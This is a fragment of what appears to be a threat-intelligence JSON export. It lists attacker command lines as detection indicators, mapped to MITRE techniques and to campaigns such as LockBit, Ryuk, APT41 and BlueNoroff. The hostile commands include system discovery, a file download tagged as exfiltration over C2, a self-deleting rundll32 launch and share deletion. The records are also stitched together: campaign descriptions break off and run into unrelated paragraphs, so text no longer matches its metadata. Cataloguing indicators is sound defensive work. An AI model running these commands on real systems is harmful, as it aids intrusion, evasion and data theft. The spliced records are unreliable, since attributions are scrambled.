profile.","threat_level_id":1,"kb_article_link":null,"coverage":{"dat_version":{"min":4110},"linux_dat_version":{"min":5031}},"updated_on":"2023-07-11T05:11:49.000Z","external_analysis":{"links":["https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/tales-from-the-trenches-a-lockbit-ransomware-story/","https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/","https://www.cisa.gov/uscert/ncas/current-activity/2022/02/07/fbi-releases-indicators-compromise-associated-lockbit-20","https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit","https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/","https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/","https://www.cisa.gov/news-events/alerts/2023/06/14/cisa-and-partners-release-joint-advisory-understanding-ransomware-threat-actors-lockbit","https://www.cisa.gov/sites/default/files/2023-06/aa23-165a_understanding_TA_LockBit.pdf","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a"]},"is_coat":1,"created_on":"2020-06-12T14:15:23.000Z"}]},{"id":"0f1db72f-0a33-417f-8209-055eaa8d11b3","type":"command-line","category":"Other","value":"%WINDIR%\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"Windows Command Shell - T1059.003"}],"rule_type":null,"campaigns":[{"id":"82a9964e-aa10-4df3-9679-40348a76ac45","name":"Siamesekitten Espionage Campaign Targets IT Company","description":"The Siamesekitten APT group, also known as Lyceum and Hexane, targeted an IT company in Israel.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"0f831a13-5dd8-49f3-9007-1c460b00138b","type":"command-line","category":"Other","value":"systeminfo","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"System Information Discovery - T1082"}],"rule_type":null,"campaigns":[{"id":"ab325b21-8b4d-46f2-8dfd-f607de31b115","name":"NetSupport Manager Used To Compromise Domain","description":"An attack campaign was discovered which began with a malicious email containing a zip file with a harmful JavaScript file. A user executed this JavaScript, which triggered a PowerShell script to install NetSupport and establish persistence in the system's registry. After five days, the threat actor conducted reconnaissance and tried to reactivate a disabled domain admin account. They also installed an OpenSSH server for persistence and established a reverse SSH tunnel to their server on a VPS.\r\n\r\nUsing the tunnel, they connected to the domain controller, used Impacket tools for discovery, and changed firewall settings on a remote server. They furthered lateral movement using Impackets wmiexec.py, deploying NetSupport malware to remote hosts. They scheduled tasks for persistence and issued discovery commands.\r\n\r\nThe next day, they deployed NetSupport on a domain controller and dumped the NTDS.dit database, likely exfiltrating it. They repeated this on another domain controller, ran an Active Directory auditing tool, and added a new account with admin privileges. They accessed the server via RDP and proceeded to disable Microsoft Defender, dump LSASS, and extract Windows event logs. Sensitive documents were accessed, and cleanup tasks were performed.\r\n\r\nThe final actions involved dropping Nim binaries to create a backdoor user, but this attempt failed.

Furthermore, it's not position independent, meaning it needs to be modified if loaded at a different base address.\r\n\r\nDuring its initial execution, the attacker uses a vulnerable utility called BrDifxapi.exe, which can be exploited for DLL side-loading. This allows the adversary to load the unsigned BloodAlchemy loader (BrLogAPI.dll) and inject shellcode into the running process.\r\n\r\nThe malware uses encryption to conceal its strings, with each string being encrypted using a one-byte decryption key and then concatenated into an encrypted blob.\r\n\r\nBloodAlchemy achieves persistence through various methods, including running as a service, utilizing a registry key, setting up a scheduled task, or using COM interfaces.\r\n\r\nFor communication, the malware employs HTTP, named pipes, or sockets. It has a limited set of commands, including modifying its toolset, launching its malware binary, uninstalling and terminating itself, and gathering information from the host.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

It is highly configurable with capabilities that range from stealing sensitive data, encrypting files using either AES or ChaCha20 encryption (strong algorithms), ability to spread laterally, kill virtual machines and wipe snapshots to prevent recovery, all explained nicely from a \"--help\" page. The ransomware also includes a json configuration file that allows for extensive customization of extensions, ransom notes, encryption subroutines, file/folder/extension exclusions, and even processes to terminate.\r\n\r\nThe software is entirely written from scratch and does not use common templates which reduces the visibility of the samples since there are no leaked template samples to start detection from.\r\n\r\nOnce a victim has been infected the groups employing BlackCat use a triple-extortion tactic.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"0ffce3ef-6f1a-4965-bfb2-012e7a99e591","type":"command-line","category":"Other","value":"download %USERPROFILE%\\Desktop\\tm remote chat.txt;","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"Exfiltration Over C2 Channel - T1041"}],"rule_type":null,"campaigns":[{"id":"89488c34-2dc5-4446-8eb2-3ad951cbd91e","name":"Threat Profile: APT41 Group","description":"APT41 is a prolific cyber threat group that carries out state-sponsored espionage activity in addition to financially motivated activity potentially outside of state control.

Blister is malware that embeds a payload within itself to execute malicious activities. The analysis included 137 unpacked Blister samples from the past one and a half years, showing a shift in tactics where attackers have increasingly used Blister in a targeted manner, enabled by environmental keying features. \r\nThere has been a notable shift from using Cobalt Strike payloads to Mythic agents, and recent samples have incorporated obfuscation techniques to evade detection. The post details the Blister loader's history, updates, and developments up to 2023, with new obfuscations and payload types observed. The payloads dropped by Blister include Cobalt Strike, Mythic, Putty, and a test application, but notably not BitRat. Of the 137 samples, they found 74 unique payloads, with some redundancy in dropped payloads like Putty or test applications.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools. Therefore, we strongly suggest to not only focus on the actual LockBit binary but to be aware of any suspicious behavior linked to any of the tools and Command-line arguments listed in this profile.","threat_level_id":1,"kb_article_link":null,"coverage":{"dat_version":{"min":4110},"linux_dat_version":{"min":5031}},"updated_on":"2023-07-11T05:11:49.000Z","external_analysis":{"links":["https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/tales-from-the-trenches-a-lockbit-ransomware-story/","https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/","https://www.cisa.gov/uscert/ncas/current-activity/2022/02/07/fbi-releases-indicators-compromise-associated-lockbit-20","https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit","https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/","https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/","https://www.cisa.gov/news-events/alerts/2023/06/14/cisa-and-partners-release-joint-advisory-understanding-ransomware-threat-actors-lockbit","https://www.cisa.gov/sites/default/files/2023-06/aa23-165a_understanding_TA_LockBit.pdf","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a"]},"is_coat":1,"created_on":"2020-06-12T14:15:23.000Z"}]},{"id":"10b069ac-d200-4f37-9478-d4337a006c09","type":"command-line","category":"Other","value":"cmd /c timeout /t 10 & Del /f /q \\”[current file name]\\” & attrib -s -h \\”[PDF decoy file]\\” & rundll32 \\”[current DLL file path]\\” #1","comment":"Malware Execution Command Ran If Windows Defender Is Detected On The Target Device","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"Windows Command Shell - T1059.003"},{"type":"mitre-attack-pattern","value":"Rundll32 - T1218.011"}],"rule_type":null,"campaigns":[{"id":"299f8fa2-8b64-4ab8-910a-178cf4e9f628","name":"BlueNoroff Introduces Novel Methods Bypassing Mark-of-The-Web","description":"The threat actor tracked as BlueNoroff, a subgroup of the Lazarus APT, has been using updated attack techniques as they attempt to evade mark of the web (MoTW) security features.

Spearphishing emails with Guyanese-themed subjects were delivered to victims, who fell prey to downloading a ZIP file, from a Vietnamese governmental site known for hosting malware, which initiated the deployment of DinodasRAT malware upon extraction. The malware is written in C++, and has various functionalities, like file exfiltration, manipulating the Windows registry, and command execution. It encrypts communication using the Tiny Encryption Algorithm (TEA) and typically communicates via TCP but has at times used UDP. The malware can capture screenshots, gather clipboard data, and exfiltrate data to its C2 server. Additionally, the time frame of the malicious activity which occurred amidst strained Guyana-China relations coupled with the use of PlugX (aka Korplug) malware strengthens the speculated China connection, but definitive attribution has yet to be made and remains of medium confidence.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

The vulnerability affects various versions of JetBrains TeamCity, a widely used application for DevOps and software development activities. Once successfully exploiting the vulnerability, the two threat actors employ distinct tools and techniques to further their malicious activities.\r\n\r\nDiamond Sleet, after compromising TeamCity servers, employs PowerShell to download various malware payloads from compromised infrastructure they control. These payloads include the ForestTiger backdoor, RollSling loader, and FeedLoad loader. These tools are used for activities such as stealing credentials from LSASS memory, loading additional payloads, and creating scheduled tasks to maintain persistence.\r\n\r\nOn the other hand, Onyx Sleet, following a successful TeamCity exploit, creates a new user account on the compromised systems, naming it \"krtbgt.\" This account is likely intended to mimic the legitimate Windows account KRBTGT, which is associated with Kerberos Ticket Granting Tickets. The threat actor adds this account to the Local Administrators Group using the \"net use\" command. They also perform system discovery tasks on compromised systems using Windows binaries. Subsequently, Onyx Sleet deploys a unique payload to these compromised systems via PowerShell. The payload, when executed, decrypts an embedded resource, and loads it into memory. This inner payload acts as a proxy tool, identified as \"HazyLoad\", facilitating a persistent connection between the compromised host and infrastructure controlled by the attackers.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

The abuse of the tool can assist in exfiltrating access keys and tokens to a domain possibly owned by a threat actor. \r\n\r\nAdversaries have gained entry via an exposed Docker REST API server, which is known to be leveraged by threat actors like TeamTNT. Attackers created a container and mounted the underlying host's root directory to the path </host> within the container. Afterward a script titled as init.sh was executed when the container was created even without any other command being supplied for execution. When Trend Micro analyzed the scrip, it noticed it was split into four parts; main, wssetup, checkkey and getrange, which enabled the attacker to use the same script for different stages of the attack. The domain amazon2aws.com, used as a phishing page and for exfiltration of data, has resolved in the past to an IP used by TeamTNT to host the domain teamtnt.red.

The group's primary objective is to steal important data and email accounts from specific individuals or organizations working in North Korea's political, diplomatic, and security sectors. This is achieved through phishing and sending malicious emails. The operation, named \"Operation Covert Stalker,\" is characterized by its stealth and persistence.\r\n\r\nThe group uses various methods to maintain connection persistence, including creating RDP access accounts and installing remote management programs. They also exploit vulnerabilities in Windows systems and unknown vulnerabilities in targeted sites. The group performs various malicious activities, such as searching for hacking targets, sending hacking emails, scanning for RDP vulnerabilities, and testing malicious codes.\r\n\r\nThe Kimsuky organization also uses ransomware to infect systems and then encourages victims to pay for recovery. They use web shells for C2 construction, management, and operation. Some of the malicious codes used by the group contain North Korean expressions, further suggesting their origin.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

The file is disguised as company promotional material and is alternately uploaded with a legitimate file to confuse analysis. \r\n\r\nUpon download, the LNK file, which is unusually large at around 300MB, contains obfuscated PowerShell commands. These commands create two files: a benign document and a malicious CAB file. The benign document is designed to appear normal, asking the user to input information for company promotional material. The CAB file contains additional malicious scripts that are executed and then deleted to remove traces.\r\n\r\nThe scripts perform various functions, including maintaining persistence, downloading additional files, collecting system information, and sending the collected information to a command and control server.

They employ techniques such as brute-forcing and using leaked credentials to breach accounts and Ubiquiti routers.\r\n\r\nIn a recent case from April 2023, APT28 utilized a phishing campaign to trick victims into running PowerShell scripts, revealing system configurations, and running processes. They've also exploited other vulnerabilities, including CVE-2022-30190, CVE-2020-12641, CVE-2020-35730, and CVE-2021-44026.\r\n\r\nTheir initial attack tools include Mimikatz and the reGeorg traffic relaying tool, as well as Mockbin and Mocky open-source services. APT28 uses a variety of VPN clients, including SurfShark, ExpressVPN, ProtonVPN, and others.\r\n\r\nData access and exfiltration are central to APT28's goals, and they retrieve authentication information, steal sensitive emails, and use CVE-2023-23397 to trigger an SMB connection for NetNTLMv2 authentication hash retrieval. They operate command and control servers using legitimate cloud services like Microsoft OneDrive and Google Drive to avoid detection.\r\n\r\nAPT28 also employs the CredoMap implant to target information in victims' web browsers, such as authentication cookies, and uses Mockbin and the Pipedream service for data exfiltration.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

The analysis has uncovered that the breach lasted 11 days, and was initiated by a phishing email where a password protected malicious ISO Zipped file was shared. Once the victim unzipped the ISO and executed it, windows would mount it as a CD or external media, and the victim would be presented access to its contents, which in this case was a single file, named \"documents\". This file, when executed, also executes the hidden BumbleBee malware loader.\r\n\r\nOnce BumbleBee was fully up and running, it contacts its C2, where it kept for a while just communicating. The DFIR Report, reported that 3 hours later, the BumbleBee drops the first stage cobalt strike beacon. This beacon once executed it started to inject into other processes on the host. From these injected processes, the attackers then started the discovery and enumeration tasks. At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools. Therefore, we strongly suggest to not only focus on the actual LockBit binary but to be aware of any suspicious behavior linked to any of the tools and Command-line arguments listed in this profile.","threat_level_id":1,"kb_article_link":null,"coverage":{"dat_version":{"min":4110},"linux_dat_version":{"min":5031}},"updated_on":"2023-07-11T05:11:49.000Z","external_analysis":{"links":["https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/tales-from-the-trenches-a-lockbit-ransomware-story/","https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/","https://www.cisa.gov/uscert/ncas/current-activity/2022/02/07/fbi-releases-indicators-compromise-associated-lockbit-20","https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit","https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/","https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/","https://www.cisa.gov/news-events/alerts/2023/06/14/cisa-and-partners-release-joint-advisory-understanding-ransomware-threat-actors-lockbit","https://www.cisa.gov/sites/default/files/2023-06/aa23-165a_understanding_TA_LockBit.pdf","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a"]},"is_coat":1,"created_on":"2020-06-12T14:15:23.000Z"}]},{"id":"11cc7a79-b8c3-11eb-9d72-02d538d9640e","type":"command-line","category":"Other","value":"net use * /DELETE /y","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"File Deletion - T1070.004"},{"type":"mitre-attack-pattern","value":"SMB/Windows Admin Shares - T1021.002"}],"rule_type":null,"campaigns":[{"id":"720f3d1b-66ee-11eb-9477-02d538d9640e","name":"BumbleBee Webshell","description":"The Microsoft Exchange and IIS servers belonging to multiple Kuwaiti organizations were compromised with the BumbleBee webshell.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools.

The analysis has uncovered that the breach lasted 11 days, and was initiated by a phishing email where a password protected malicious ISO Zipped file was shared. Once the victim unzipped the ISO and executed it, windows would mount it as a CD or external media, and the victim would be presented access to its contents, which in this case was a single file, named \"documents\". This file, when executed, also executes the hidden BumbleBee malware loader.\r\n\r\nOnce BumbleBee was fully up and running, it contacts its C2, where it kept for a while just communicating. The DFIR Report, reported that 3 hours later, the BumbleBee drops the first stage cobalt strike beacon. This beacon once executed it started to inject into other processes on the host. From these injected processes, the attackers then started the discovery and enumeration tasks. At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

DFIR Report as well as McAfee ATR has observed the same techniques in other intrusions and understanding these techniques will allow defenders to disrupt such intrusion activity and deny it in their own networks.\r\nWe strongly advise customers to study this campaign and the supplied hunting rules as most of the rules will help against a variety of threats not limited to Conti ransomware. \r\n\r\nMcAfee’s ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"133468de-31c3-44e3-aa9c-790332f444c8","type":"command-line","category":"Other","value":"cmd.exe /C del /f /q /a %WINDIR%\\temp\\*.tmp > %WINDIR%\\Temp\\[a-zA-Z]{8}.tmp 2>&1","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"Windows Command Shell - T1059.003"}],"rule_type":null,"campaigns":[{"id":"bb977e44-6cf7-4e8c-9cd4-a22f9cd52313","name":"The Lazarus Group No Pineapple Campaign","description":"The Lazarus APT Group attacked the medical research and technology sectors as well as others with backdoors, web shells, remote access trojans, information stealers, and off the shelve tools.

